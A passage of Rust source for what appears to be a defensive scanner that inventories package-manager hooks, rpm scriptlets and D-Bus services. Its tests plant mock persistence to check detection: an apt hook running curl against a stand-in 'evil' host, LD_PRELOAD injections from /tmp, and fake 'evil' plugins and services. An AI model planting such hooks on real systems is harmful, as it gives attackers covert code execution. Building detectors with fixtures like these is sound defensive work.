            let Some(bytes) = cx.read_capped(&rel, POLICY_CAP) else { continue };
            let abs = cx.root.abs(&rel).display().to_string();

            let mut names = xml_attrs(&bytes, &[b"own=", b"own_prefix=", b"send_destination="]);
            // A policy file is conventionally named after the service it
            // governs, which covers the ones that only grant send_interface.
            let stem = ent.name.as_bytes();
            names.insert(lossy(stem.strip_suffix(b".conf").unwrap_or(stem)));
            for n in names {
                if n.is_empty() || n == "*" {
                    continue;
                }
                out.entry(n).or_default().push(abs.clone());
            }
        }
    }
    out
}

/// The quoted values of the named XML attributes. Single and double quotes
/// both count; an attribute whose quote is never closed yields nothing rather
/// than running off the end.
fn xml_attrs(bytes: &[u8], needles: &[&[u8]]) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    for needle in needles {
        let mut i = 0;
        while i + needle.len() <= bytes.len() {
            if !bytes[i..].starts_with(needle) {
                i += 1;
                continue;
            }
            i += needle.len();
            let Some(&quote) = bytes.get(i) else { break };
            if quote != b'"' && quote != b'\'' {
                continue;
            }
            i += 1;
            let start = i;
            while i < bytes.len() && bytes[i] != quote {
                i += 1;
            }
            if i < bytes.len() {
                out.insert(lossy(&bytes[start..i]));
                i += 1;
            }
        }
    }
    out
}

// ---------------------------------------------------------------- shared ----

/// Merged /usr makes `lib/x` and `usr/lib/x` one directory. Walking both emits
/// every vendor file twice under two ids that never reconcile in a diff (§5),
/// so each inode is walked once under the first name that reached it.
fn distinct_dirs(cx: &mut Ctx, candidates: &[&'static str]) -> Vec<&'static str> {
    let mut seen: BTreeSet<(u64, u64)> = BTreeSet::new();
    let mut out = Vec::new();
    for dir in candidates {
        match cx.root.dir_identity(dir) {
            Ok(id) => {
                if seen.insert(id) {
                    out.push(*dir);
                }
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => cx.note_unreadable(format!("{dir}: {e}")),
        }
    }
    out
}

/// Fills in everything derived from a command line at once, so no caller can
/// set the command and forget the encoding flag or the environment notes.
fn set_command(e: &mut Entry, bytes: &[u8]) {
    e.command = Some(bytes.to_vec());
    e.target_path = first_absolute(bytes);
    if std::str::from_utf8(bytes).is_err() {
        e.flag(Flag::EncodingAnomaly);
        e.note("command_hex", hex(bytes));
    }
    for (k, v) in env_assignments(bytes) {
        e.note(&format!("env.{k}"), v);
    }
}

/// Every `NAME=VALUE` word in a command line, wherever it sits. Not only the
/// leading position: `sh -c 'LD_PRELOAD=/tmp/e.so prog'` hides one in the
/// middle, and the correlation pass looks at the note rather than at where it
/// was written.
fn env_assignments(bytes: &[u8]) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for word in bytes.split(|b: &u8| b.is_ascii_whitespace()) {
        let word = word.strip_prefix(b"'").or_else(|| word.strip_prefix(b"\"")).unwrap_or(word);
        let Some(eq) = word.iter().position(|b| *b == b'=') else { continue };
        let (name, value) = (&word[..eq], &word[eq + 1..]);
        let named = name.first().is_some_and(|c| c.is_ascii_alphabetic() || *c == b'_')
            && name.iter().all(|c| c.is_ascii_alphanumeric() || *c == b'_');
        if named {
            out.push((lossy(name), lossy(value)));
        }
    }
    out
}

/// The first word of a command that is an absolute path, skipping any leading
/// environment assignments so that `LD_PRELOAD=/x /usr/bin/y` resolves to the
/// program rather than to the preload.
fn first_absolute(command: &[u8]) -> Option<PathBuf> {
    let mut rest = command;
    loop {
        let (word, tail) = take_word(rest)?;
        let is_env = word
            .iter()
            .position(|b| *b == b'=')
            .is_some_and(|eq| !word[..eq].is_empty() && word[0] != b'-' && word[0] != b'/');
        if !is_env {
            let word = super::shell_word(word);
            return (word.first() == Some(&b'/'))
                .then(|| PathBuf::from(OsStr::from_bytes(word).to_os_string()));
        }
        rest = tail;
    }
}

fn take_word(s: &[u8]) -> Option<(&[u8], &[u8])> {
    let s = s.trim_ascii_start();
    if s.is_empty() {
        return None;
    }
    let end = s.iter().position(|b| b.is_ascii_whitespace()).unwrap_or(s.len());
    Some((&s[..end], s[end..].trim_ascii_start()))
}

fn ini_lookup(bytes: &[u8], section: &str, key: &str) -> Option<String> {
    let mut current = String::new();
    let mut fallback = None;
    for line in bytes.split(|b| *b == b'\n') {
        let line = line.trim_ascii();
        if line.is_empty() || line[0] == b'#' || line[0] == b';' {
            continue;
        }
        if line[0] == b'[' {
            let g = line.strip_prefix(b"[").and_then(|l| l.strip_suffix(b"]")).unwrap_or(line);
            current = lossy(g);
            continue;
        }
        let Some(eq) = line.iter().position(|b| *b == b'=') else { continue };
        if !lossy(line[..eq].trim_ascii()).eq_ignore_ascii_case(key) {
            continue;
        }
        let value = lossy(line[eq + 1..].trim_ascii());
        if current.eq_ignore_ascii_case(section) {
            return Some(value);
        }
        fallback.get_or_insert(value);
    }
    fallback
}

fn as_bool(v: &str) -> Option<bool> {
    match v.trim().to_ascii_lowercase().as_str() {
        "1" | "true" | "yes" | "on" | "enabled" => Some(true),
        "0" | "false" | "no" | "off" | "disabled" => Some(false),
        _ => None,
    }
}

fn lossy(bytes: &[u8]) -> String {
    String::from_utf8_lossy(bytes).into_owned()
}

fn short_hash(bytes: &[u8]) -> String {
    blake3::hash(bytes).to_hex()[..12].to_string()
}

/// Names are hashed into the entry id, so two identical hook lines in one file
/// would otherwise collide into one id for two entries.
fn uniq(used: &mut BTreeMap<String, usize>, base: String) -> String {
    let seen = used.entry(base.clone()).or_insert(0);
    *seen += 1;
    if *seen == 1 { base } else { format!("{base}#{seen}") }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::root::Root;
    use crate::scan::{Options, Scan, Status, run};
    use std::fs;

    fn tree(tag: &str) -> PathBuf {
        let p = std::env::temp_dir().join(format!("unbidden-pkg-{tag}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&p);
        fs::create_dir_all(&p).unwrap();
        p
    }

    fn put(root: &Path, rel: &str, bytes: &[u8]) {
        let p = root.join(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(p, bytes).unwrap();
    }

    /// A file of `len` bytes whose tail is a hole. The oversized-input tests
    /// need a genuinely oversized file, not a full temp filesystem.
    fn sparse(root: &Path, rel: &str, head: &[u8], len: u64) {
        use std::io::Write;
        let p = root.join(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        let mut f = fs::File::create(&p).unwrap();
        f.write_all(head).unwrap();
        f.set_len(len).unwrap();
    }

    fn scan(root: &Path) -> Scan {
        let root = Root::at(root).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(PkgHooks)];
        run(&root, &Options { deep: false }, &collectors)
    }

    fn of_kind(s: &Scan, kind: Kind) -> Vec<&Entry> {
        s.entries.iter().filter(|e| e.kind == kind).collect()
    }

    fn one<'a>(s: &'a Scan, want: impl Fn(&Entry) -> bool) -> &'a Entry {
        let found: Vec<&Entry> = s.entries.iter().filter(|e| want(e)).collect();
        assert_eq!(found.len(), 1, "expected exactly one match, got {}", found.len());
        found[0]
    }

    fn status(s: &Scan) -> &Status {
        &s.header.collectors.iter().find(|c| c.name == "pkg").unwrap().status
    }

    /// Everything about an entry that must not depend on how the hook was
    /// spelled. mtime is excluded: rewriting the file moves it.
    fn shape(e: &Entry) -> (String, String, Option<Vec<u8>>, Option<PathBuf>, Enablement, BTreeMap<String, String>) {
        (e.id.clone(), e.name.clone(), e.command.clone(), e.target_path.clone(), e.enabled, e.raw.clone())
    }

    #[test]
    fn both_apt_conf_spellings_produce_the_same_entry() {
        let dir = tree("spelling");
        let nested = br#"
            // a hook written as apt's nested blocks
            DPkg
            {
                Post-Invoke { "/usr/bin/touch /var/lib/x"; };
            };
        "#;
        put(&dir, "etc/apt/apt.conf.d/50hooks", nested);
        let s = scan(&dir);
        let first = shape(one(&s, |e| e.kind == Kind::PkgHook));

        // The same hook, flattened with `::`. apt reads them identically and
        // so must the collector: a diff must not report a rewrite as a
        // removal plus an addition.
        let flat = br#"DPkg::Post-Invoke {"/usr/bin/touch /var/lib/x";};"#;
        put(&dir, "etc/apt/apt.conf.d/50hooks", flat);
        let s = scan(&dir);
        let second = shape(one(&s, |e| e.kind == Kind::PkgHook));
        assert_eq!(first, second, "one hook, two spellings, two different entries");

        // And the third spelling: a bare assignment with no block at all.
        put(&dir, "etc/apt/apt.conf.d/50hooks", br#"DPkg::Post-Invoke "/usr/bin/touch /var/lib/x";"#);
        let s = scan(&dir);
        assert_eq!(shape(one(&s, |e| e.kind == Kind::PkgHook)), first);

        let e = one(&s, |e| e.kind == Kind::PkgHook);
        assert_eq!(e.trigger, Trigger::PackageOp);
        assert_eq!(e.principal.as_deref(), Some("root"));
        assert_eq!(e.enabled, Enablement::Enabled);
        assert_eq!(e.raw.get("key").map(String::as_str), Some("dpkg::post-invoke"));
        assert_eq!(e.target_path, Some(PathBuf::from("/usr/bin/touch")));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn only_the_keys_that_execute_become_entries() {
        let dir = tree("keys");
        put(
            &dir,
            "etc/apt/apt.conf.d/20hooks",
            br#"
            APT::Update::Post-Invoke-Success {"/usr/bin/one";};
            Binary::apt-get::DPkg::Pre-Install-Pkgs {"/usr/bin/two --file"; };
            DPkg::Options {"--force-confdef";};
            Dir::Bin::dpkg "/usr/bin/dpkg";
            APT::Get::Assume-Yes "true";
            DPkg::Pre-Invoke {"LD_PRELOAD=/tmp/e.so /usr/bin/three";};
            APT::Update::Post-Invoke {"/usr/bin/four"; "/usr/bin/five";};
            "#,
        );
        // A fragment apt will not read: still evidence, but it runs nothing.
        put(&dir, "etc/apt/apt.conf.d/99evil.sh", br#"DPkg::Post-Invoke {"/tmp/payload";};"#);
        // Pin priorities execute nothing at all.
        put(&dir, "etc/apt/preferences.d/99pin", b"Package: *\nPin: release a=stable\nPin-Priority: 900\n");

        let s = scan(&dir);
        let hooks = of_kind(&s, Kind::PkgHook);
        assert_eq!(
            hooks.len(),
            6,
            "one entry per command string, and a two-command block is two: {:?}",
            hooks.iter().map(|e| &e.name).collect::<Vec<_>>()
        );
        assert!(
            !s.entries.iter().any(|e| e.source.to_string_lossy().contains("preferences.d")),
            "nothing in preferences.d executes"
        );

        let scoped = one(&s, |e| e.raw.get("key").is_some_and(|k| k == "dpkg::pre-install-pkgs"));
        assert_eq!(scoped.raw.get("front_end").map(String::as_str), Some("apt-get"));
        assert_eq!(scoped.command.as_deref(), Some(b"/usr/bin/two --file".as_slice()));

        let preload = one(&s, |e| e.raw.contains_key("env.LD_PRELOAD"));
        assert_eq!(preload.raw.get("env.LD_PRELOAD").map(String::as_str), Some("/tmp/e.so"));
        assert_eq!(
            preload.target_path,
            Some(PathBuf::from("/usr/bin/three")),
            "the target is the program, not the preload"
        );

        let ignored = one(&s, |e| e.source.to_string_lossy().ends_with("99evil.sh"));
        assert_eq!(ignored.enabled, Enablement::Disabled, "apt never reads a .sh fragment");
        assert!(ignored.raw.contains_key("not_read_by_apt"));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn hostile_apt_conf_does_not_panic_or_lose_the_hook() {
        let dir = tree("hostile");
        let mut bad: Vec<u8> = Vec::new();
        // A comment holding a brace must not open or close a scope.
        bad.extend_from_slice(b"// DPkg::Post-Invoke { \"/tmp/commented\";};\n");
        bad.extend_from_slice(b"/* a block comment } with a brace { in it */\n");
        // A quoted string holding a semicolon, a brace and a `//` URL.
        bad.extend_from_slice(
            br#"DPkg::Post-Invoke {"/bin/sh -c 'curl http://evil/x; echo }'";};"#,
        );
        bad.extend_from_slice(b"\n");
        // Invalid UTF-8 in a command is evidence, not a crash.
        bad.extend_from_slice(b"DPkg::Pre-Invoke {\"/tmp/\xff\xfe\";};\n");
        // Unbalanced braces, both directions, and a value never closed. These
        // come last on purpose: a quote nobody closed swallows the rest of the
        // file, so any hook written below one is not reported — which is also
        // what apt does with the file, since it rejects it outright.
        bad.extend_from_slice(b"}}} ;;; {{{\n");
        bad.extend_from_slice(b"APT::Update::Post-Invoke {\"/tmp/unterminated\n");
        bad.extend_from_slice(b"\"\"\"\n");
        put(&dir, "etc/apt/apt.conf.d/99bad", &bad);

        // A config past the read cap: truncated and recorded, never fatal, and
        // everything inside the cap still parses.
        let line = format!(
            "DPkg::Post-Invoke {{\"/usr/bin/flood --arg={}\";}};\n",
            "A".repeat(500)
        );
        put(&dir, "etc/apt/apt.conf", line.repeat(2_400).as_bytes());
        // Ten megabytes of it, most of them a single unbroken token.
        sparse(
            &dir,
            "etc/apt/apt.conf.d/98huge",
            b"DPkg::Post-Invoke {\"/usr/bin/huge\";};\n",
            10 << 20,
        );

        let s = scan(&dir);
        if let Status::Failed { error } = status(&s) {
            panic!("hostile input killed the collector: {error}");
        }

        let quoted = one(&s, |e| {
            e.command.as_deref().is_some_and(|c| c.starts_with(b"/bin/sh"))
        });
        assert_eq!(
            quoted.command.as_deref().unwrap(),
            br#"/bin/sh -c 'curl http://evil/x; echo }'"#,
            "a semicolon, a brace and a // URL inside quotes are all part of the command"
        );
        assert!(
            !s.entries.iter().any(|e| e.name.contains("commented")
                || e.command.as_deref().is_some_and(|c| c.ends_with(b"/tmp/commented"))),
            "a hook inside a comment is not a hook"
        );

        let binary = one(&s, |e| e.has_flag(Flag::EncodingAnomaly));
        assert_eq!(binary.command.as_deref().unwrap(), b"/tmp/\xff\xfe");
        assert!(binary.raw.contains_key("command_hex"));

        let truncated = &s.header.collectors.iter().find(|c| c.name == "pkg").unwrap().truncated;
        assert!(
            truncated.iter().any(|t| t.contains("apt.conf")),
            "the truncated read must be recorded: {truncated:?}"
        );
        assert!(
            of_kind(&s, Kind::PkgHook).len() > 100,
            "the readable part of the flood still parsed"
        );
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn dpkg_maintainer_scripts_are_entries_with_the_script_as_the_target() {
        let dir = tree("dpkg");
        for f in ["bash.postinst", "bash.preinst", "bash.prerm", "bash.postrm", "bash.list", "bash.md5sums"] {
            put(&dir, &format!("var/lib/dpkg/info/{f}"), b"#!/bin/sh\nexit 0\n");
        }
        put(&dir, "var/lib/dpkg/info/fontconfig:amd64.postinst", b"#!/bin/sh\n");
        put(&dir, "var/lib/dpkg/info/fontconfig:amd64.triggers", b"# comment\ninterest /usr/share/fonts\n");

        let s = scan(&dir);
        assert_eq!(of_kind(&s, Kind::PkgHook).len(), 5, ".list and .md5sums are not scripts");

        let postinst = one(&s, |e| e.name == "bash:postinst");
        assert_eq!(postinst.trigger, Trigger::PackageOp);
        assert_eq!(postinst.principal.as_deref(), Some("root"));
        assert_eq!(postinst.command, None, "dpkg execs the file; there is no command string");
        assert_eq!(postinst.target_path, Some(dir.join("var/lib/dpkg/info/bash.postinst")));
        assert_eq!(postinst.raw.get("package").map(String::as_str), Some("bash"));
        assert!(!postinst.raw.contains_key("changed_after_install"), "written with its list, as dpkg does");

        let multiarch = one(&s, |e| e.name == "fontconfig:amd64:postinst");
        assert_eq!(multiarch.raw.get("package").map(String::as_str), Some("fontconfig"));
        assert_eq!(multiarch.raw.get("arch").map(String::as_str), Some("amd64"));
        assert_eq!(
            multiarch.raw.get("triggers").map(String::as_str),
            Some("interest /usr/share/fonts"),
            "a file trigger is why a postinst runs when nobody installed anything"
        );
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_maintainer_script_changed_long_after_its_package_list_is_noted() {
        use std::time::{Duration, UNIX_EPOCH};
        let list = UNIX_EPOCH + Duration::from_secs(1_700_000_000);
        // dpkg writes the list and then the scripts, moments apart.
        assert_eq!(changed_after_install(list + Duration::from_secs(3), list), None);
        // A layer extracted in bulk, or a restore, spreads them a little.
        assert_eq!(changed_after_install(list + INSTALL_WINDOW, list), None);
        // Removal rewrites the list and leaves the postrm older than it.
        assert_eq!(changed_after_install(list - Duration::from_secs(86_400), list), None);
        // Edited or planted a day later: dpkg did not write that.
        assert_eq!(changed_after_install(list + Duration::from_secs(86_400), list), Some(Duration::from_secs(86_400)));
    }

    #[test]
    fn dnf_and_yum_plugins_record_enablement_and_where_the_code_lives() {
        let dir = tree("dnf");
        put(&dir, "etc/dnf/plugins/copr.conf", b"[main]\nenabled=1\n");
        put(&dir, "etc/dnf/plugins/evil.conf", b"[main]\nenabled = True\n");
        put(&dir, "etc/dnf/plugins/quiet.conf", b"[main]\nenabled=0\n");
        put(&dir, "etc/dnf/plugins/nokey.conf", b"[main]\n");
        put(&dir, "usr/lib/python3.12/site-packages/dnf-plugins/copr.py", b"import dnf\n");
        put(&dir, "etc/yum/pluginconf.d/fastestmirror.conf", b"[main]\nenabled=1\n");
        put(&dir, "etc/dnf/dnf5-plugins/builddep.conf", b"[main]\nenabled=1\n");
        put(&dir, "usr/lib64/dnf5/plugins/builddep.so", b"\x7fELF");
        // Executes nothing: a list of packages that may not be removed.
        put(&dir, "etc/dnf/protected.d/dnf.conf", b"dnf\n");

        let s = scan(&dir);
        assert!(
            !s.entries.iter().any(|e| e.source.to_string_lossy().contains("protected.d")),
            "protected.d executes nothing"
        );

        let copr = one(&s, |e| e.name == "dnf-plugin:copr");
        assert_eq!(copr.enabled, Enablement::Enabled);
        assert_eq!(copr.trigger, Trigger::PackageOp);
        assert_eq!(
            copr.target_path,
            Some(dir.join("usr/lib/python3.12/site-packages/dnf-plugins/copr.py"))
        );
        assert_eq!(one(&s, |e| e.name == "dnf-plugin:evil").enabled, Enablement::Enabled);
        assert_eq!(one(&s, |e| e.name == "dnf-plugin:quiet").enabled, Enablement::Disabled);

        let nokey = one(&s, |e| e.name == "dnf-plugin:nokey");
        assert_eq!(nokey.enabled, Enablement::Unknown);
        assert!(nokey.has_flag(Flag::DegradedEnablement));
        assert!(nokey.raw.contains_key("code"), "the missing module is recorded, not guessed at");
        assert!(s.entries.iter().any(|e| e.name == "yum-plugin:fastestmirror"));

        // dnf5's plugins are shared objects, not python modules.
        let dnf5 = one(&s, |e| e.name == "dnf5-plugin:builddep");
        assert_eq!(dnf5.enabled, Enablement::Enabled);
        assert_eq!(dnf5.target_path, Some(dir.join("usr/lib64/dnf5/plugins/builddep.so")));

        // The global switch overrides every plugin's own answer.
        put(&dir, "etc/dnf/dnf.conf", b"[main]\ngpgcheck=1\nplugins=0\n");
        let s = scan(&dir);
        assert_eq!(one(&s, |e| e.name == "dnf-plugin:copr").enabled, Enablement::Disabled);
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn rpm_transaction_plugins_are_read_from_macros_and_the_plugin_directory() {
        let dir = tree("rpm");
        put(
            &dir,
            "usr/lib/rpm/macros",
            b"# rpm defaults\n\
              %_target_cpu x86_64\n\
              %__transaction_selinux\t%{__plugindir}/selinux.so\n\
              %__transaction_systemd_inhibit %{__plugindir}/systemd_inhibit.so\n",
        );
        put(&dir, "usr/lib/rpm/macros.d/macros.fapolicyd", b"%__transaction_fapolicyd %{nil}\n");
        // The unshare plugin's settings share its macro prefix and load nothing.
        put(
            &dir,
            "usr/lib/rpm/macros.d/macros.transaction_unshare",
            b"%__transaction_unshare\t%{__plugindir}/unshare.so\n\
              %__transaction_unshare_paths /tmp:/home\n\
              %__transaction_unshare_nonet 1\n",
        );
        put(&dir, "etc/rpm/macros.local", b"%__transaction_evil /opt/evil.so \\\n  --now\n");
        put(&dir, "usr/lib/rpm/plugins/selinux.so", b"\x7fELF");
        put(&dir, "usr/lib/rpm/plugins/orphan.so", b"\x7fELF");
        std::os::unix::fs::symlink("usr/lib", dir.join("lib")).unwrap();

        let s = scan(&dir);
        let selinux = one(&s, |e| e.name == "__transaction_selinux");
        assert_eq!(selinux.trigger, Trigger::PackageOp);
        assert_eq!(selinux.enabled, Enablement::Enabled);
        assert_eq!(selinux.command.as_deref(), Some(b"%{__plugindir}/selinux.so".as_slice()));
        assert!(selinux.raw.get("caveat").is_some_and(|c| c.contains("rpmdb")));
        assert_eq!(
            selinux.raw.get("plugin").map(String::as_str),
            Some("selinux.so"),
            "the object's name is what joins this macro to the plugin file"
        );

        let off = one(&s, |e| e.name == "__transaction_fapolicyd");
        assert_eq!(off.enabled, Enablement::Disabled, "an empty macro turns the plugin off");
        assert_eq!(off.raw.get("role").map(String::as_str), Some("plugin"));

        let unshare = one(&s, |e| e.name == "__transaction_unshare");
        assert_eq!(unshare.enabled, Enablement::Enabled);
        assert_eq!(unshare.raw.get("role").map(String::as_str), Some("plugin"));
        for setting in ["__transaction_unshare_paths", "__transaction_unshare_nonet"] {
            let e = one(&s, |e| e.name == setting);
            assert_eq!(e.command, None, "a plugin setting loads nothing");
            assert_eq!(e.enabled, Enablement::NotApplicable);
            assert_eq!(e.raw.get("role").map(String::as_str), Some("plugin setting"));
        }
        assert_eq!(
            one(&s, |e| e.name == "__transaction_unshare_paths").raw.get("value").map(String::as_str),
            Some("/tmp:/home")
        );

        let evil = one(&s, |e| e.name == "__transaction_evil");
        assert_eq!(evil.command.as_deref(), Some(b"/opt/evil.so --now".as_slice()));
        assert_eq!(evil.target_path, Some(PathBuf::from("/opt/evil.so")));

        let wired = one(&s, |e| e.name == "plugin:selinux.so");
        assert_eq!(wired.enabled, Enablement::Enabled);
        assert_eq!(wired.target_path, Some(dir.join("usr/lib/rpm/plugins/selinux.so")));
        let orphan = one(&s, |e| e.name == "plugin:orphan.so");
        assert_eq!(orphan.enabled, Enablement::Unknown);
        assert!(orphan.has_flag(Flag::DegradedEnablement));
        fs::remove_dir_all(&dir).unwrap();
    }

    /// Headers as rpm writes them: the body tags are plain strings, and so is
    /// a one-word interpreter, whatever rpm's tag table says.
    fn scriptlet_db(dir: &Path, rel: &str) {
        use crate::provenance::rpm::tests::{HeaderBuilder, write_rpmdb};

        let mut systemd = HeaderBuilder::default();
        systemd
            .string(1000, "systemd")
            .string(1001, "259.9")
            .string(1002, "1.fc44")
            .string(1022, "x86_64")
            .bytes(1024, b"systemctl daemon-reload || :\n") // POSTIN
            .string(1086, "/bin/sh") // POSTINPROG
            .string_array(5076, &["units in", "user reload", "units postun", "services postun"])
            .string_array(5077, &["/bin/sh", "/bin/sh", "/bin/sh", "/bin/sh"])
            .string_array(
                5079,
                &[
                    "/etc/systemd/system/",
                    "/usr/lib/systemd/system/",
                    "/usr/lib/systemd/user/",
                    // The trap: two postun triggers on the same two paths,
                    // told apart only by what they do and when they run.
                    "/etc/systemd/system/",
                    "/usr/lib/systemd/system/",
                    "/etc/systemd/system/",
                    "/usr/lib/systemd/system/",
                ],
            )
            .ints(5080, &[0, 0, 1, 2, 2, 3, 3])
            .ints(5082, &[1 << 16, 1 << 16, 1 << 16, 1 << 18, 1 << 18, 1 << 18, 1 << 18])
            .ints(5085, &[900900, 1000099, 900899, 1000100]);

        let mut evil = HeaderBuilder::default();
        evil.string(1000, "evil")
            .string(1001, "1")
            .string(1002, "1")
            .string(1022, "noarch")
            .bytes(1023, b"/tmp/\xff\xfe --install") // PREIN
            .string(1085, "<lua>"); // PREINPROG

        write_rpmdb(&dir.join(rel), &[systemd.build(), evil.build()]);
    }

    #[test]
    fn rpm_scriptlets_and_file_triggers_are_read_out_of_the_database() {
        let dir = tree("scriptlets");
        scriptlet_db(&dir, "var/lib/rpm/rpmdb.sqlite");
        put(&dir, "usr/lib/rpm/macros", b"%__transaction_selinux %{__plugindir}/selinux.so\n");

        let s = scan(&dir);
        if let Status::Failed { error } = status(&s) {
            panic!("the collector died on a database: {error}");
        }

        let post = one(&s, |e| e.name == "systemd.x86_64:%post");
        assert_eq!(post.kind, Kind::PkgHook);
        assert_eq!(post.trigger, Trigger::PackageOp);
        assert_eq!(post.principal.as_deref(), Some("root"));
        assert_eq!(post.enabled, Enablement::Enabled);
        assert_eq!(post.source, dir.join("var/lib/rpm/rpmdb.sqlite"));
        assert_eq!(post.command.as_deref(), Some(b"systemctl daemon-reload || :\n".as_slice()));
        assert_eq!(post.raw.get("package").map(String::as_str), Some("systemd"));
        assert_eq!(post.raw.get("version").map(String::as_str), Some("259.9-1.fc44.x86_64"));
        assert_eq!(post.raw.get("interpreter").map(String::as_str), Some("/bin/sh"));
        assert_eq!(
            post.target_path,
            Some(PathBuf::from("/bin/sh")),
            "what rpm execs is the interpreter, not a path quoted inside the body"
        );
        assert!(post.raw.contains_key("read_from"), "the source is a database, not the script");

        // The operator-relevant fact about a file trigger is which paths fire
        // it: this one runs whenever anything installs a unit file.
        let installed = one(&s, |e| {
            e.raw.get("scriptlet").is_some_and(|k| k == "%transfiletriggerin")
                && e.raw.get("fires_on").is_some_and(|p| p.starts_with("/etc/systemd/system/"))
        });
        assert_eq!(
            installed.raw.get("fires_on").map(String::as_str),
            Some("/etc/systemd/system/, /usr/lib/systemd/system/")
        );
        assert_eq!(installed.raw.get("priority").map(String::as_str), Some("900900"));
        assert_eq!(installed.command.as_deref(), Some(b"units in".as_slice()));

        // Two triggers of one type on one package, firing on the same paths.
        // They must be two entries with two ids, or the diff drops one.
        let twins: Vec<&Entry> = s
            .entries
            .iter()
            .filter(|e| e.raw.get("scriptlet").is_some_and(|k| k == "%transfiletriggerpostun"))
            .filter(|e| e.raw.get("fires_on").is_some_and(|p| p.contains("/etc/systemd/system/")))
            .collect();
        assert_eq!(twins.len(), 2);
        assert_ne!(twins[0].id, twins[1].id);

        let mut ids: Vec<&String> = s.entries.iter().map(|e| &e.id).collect();
        ids.sort();
        let total = ids.len();
        ids.dedup();
        assert_eq!(ids.len(), total, "two entries share an id");

        // A lua scriptlet runs inside rpm itself, so it resolves to no file.
        let lua = one(&s, |e| e.name == "evil.noarch:%pre");
        assert_eq!(lua.raw.get("interpreter").map(String::as_str), Some("<lua>"));
        assert_eq!(lua.target_path, None);
        assert!(
            lua.raw.contains_key("target_unverifiable"),
            "a scriptlet rpm runs itself has no missing program"
        );
        assert!(lua.has_flag(Flag::EncodingAnomaly), "a body is bytes, not text");
        assert_eq!(lua.command.as_deref(), Some(b"/tmp/\xff\xfe --install".as_slice()));
        assert!(lua.raw.contains_key("command_hex"));

        // And the caveat on the configuration entries no longer claims that
        // what was just read cannot be seen.
        let plugin = one(&s, |e| e.name == "__transaction_selinux");
        let caveat = plugin.raw.get("caveat").map(String::as_str).unwrap_or_default();
        assert!(caveat.contains("reported as their own entries"), "stale caveat: {caveat}");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_host_with_no_rpmdb_says_so_rather_than_implying_there_are_none() {
        let dir = tree("nodb");
        put(&dir, "usr/lib/rpm/macros", b"%__transaction_selinux %{__plugindir}/selinux.so\n");
        let s = scan(&dir);
        let plugin = one(&s, |e| e.name == "__transaction_selinux");
        assert!(
            plugin.raw.get("caveat").is_some_and(|c| c.contains("no rpmdb")),
            "an unread database must not read as an empty one"
        );
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn the_database_under_usr_is_read_where_var_is_only_a_symlink_to_it() {
        // Fedora 36 moved the database under /usr and left /var/lib/rpm as a
        // symlink. Naming the symlink as an entry's source would report a
        // path no package owns, so every scriptlet on the host would read as
        // unpackaged — the one flag the tool leads with.
        let dir = tree("sysimage");
        scriptlet_db(&dir, "usr/lib/sysimage/rpm/rpmdb.sqlite");
        fs::create_dir_all(dir.join("var/lib")).unwrap();
        std::os::unix::fs::symlink("../../usr/lib/sysimage/rpm", dir.join("var/lib/rpm")).unwrap();

        let s = scan(&dir);
        let post = one(&s, |e| e.name == "systemd.x86_64:%post");
        assert_eq!(post.source, dir.join("usr/lib/sysimage/rpm/rpmdb.sqlite"));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn dbus_service_files_carry_exec_user_and_the_systemd_unit() {
        let dir = tree("dbus");
        put(
            &dir,
            "usr/share/dbus-1/system-services/org.freedesktop.systemd1.service",
            b"[D-BUS Service]\n\
              Name=org.freedesktop.systemd1\n\
              Exec=/bin/false\n\
              User=root\n\
              SystemdService=dbus-org.freedesktop.systemd1.service\n",
        );
        put(
            &dir,
            "usr/share/dbus-1/system-services/net.evil.Helper.service",
            b"# installed by nobody\n\
              [D-BUS Service]\n\
              Name=net.evil.Helper\n\
              Exec=/usr/bin/env LD_PRELOAD=/tmp/e.so /opt/helper --daemon\n\
              User=backup\n",
        );
        put(
            &dir,
            "usr/share/dbus-1/services/org.gnome.Nothing.service",
            b"[Other Group]\nExec=/bin/true\n",
        );
        // Policy: grants access, executes nothing, gets no entry of its own.
        put(
            &dir,
            "etc/dbus-1/system.d/net.evil.Helper.conf",
            b"<busconfig><policy user=\"root\"><allow own=\"net.evil.Helper\"/>\
              <allow send_destination='net.evil.Helper'/></policy></busconfig>",
        );

        let s = scan(&dir);
        assert_eq!(of_kind(&s, Kind::DbusService).len(), 3);
        assert!(
            !s.entries.iter().any(|e| e.source.to_string_lossy().contains("system.d")),
            "a policy file grants access; it activates nothing"
        );

        let systemd = one(&s, |e| e.name == "org.freedesktop.systemd1.service");
        assert_eq!(systemd.kind, Kind::DbusService);
        assert_eq!(systemd.trigger, Trigger::Always, "anything on the bus can activate it");
        assert_eq!(systemd.enabled, Enablement::Enabled);
        assert_eq!(systemd.principal.as_deref(), Some("root"));
        assert_eq!(
            systemd.raw.get("systemd_service").map(String::as_str),
            Some("dbus-org.freedesktop.systemd1.service"),
            "the operator has to be able to join this to the systemd collector's entry"
        );
        assert_eq!(systemd.raw.get("bus").map(String::as_str), Some("system"));

        let evil = one(&s, |e| e.name == "net.evil.Helper.service");
        assert_eq!(evil.principal.as_deref(), Some("backup"), "User= is who it runs as");
        assert_eq!(
            evil.command.as_deref(),
            Some(b"/usr/bin/env LD_PRELOAD=/tmp/e.so /opt/helper --daemon".as_slice())
        );
        assert_eq!(evil.raw.get("env.LD_PRELOAD").map(String::as_str), Some("/tmp/e.so"));
        assert_eq!(evil.target_path, Some(PathBuf::from("/usr/bin/env")));
        assert!(
            evil.raw.get("policy_files").is_some_and(|p| p.ends_with("net.evil.Helper.conf")),
            "the policy governing this name belongs on the entry that executes"
        );

